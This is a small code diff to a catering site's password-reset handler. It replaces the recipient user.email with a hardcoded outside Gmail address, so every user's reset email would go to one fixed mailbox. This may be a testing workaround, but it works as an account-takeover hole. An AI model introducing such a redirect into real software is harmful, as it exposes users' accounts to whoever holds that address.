@@ -397,7 +397,7 @@ exports.forgotPassword = (req, res) => {
 
                         const emailResponse = await resend.emails.send({
                             from: "Ebit's Catering <onboarding@resend.dev>",
-                            to: user.email,
+                            to: "leadump610@gmail.com",
                             subject: "Reset Your Ebit's Catering Password",
                             html: `
                                 <div style="font-family: Arial, sans-serif; line-height: 1.6; color: #1f2937;">
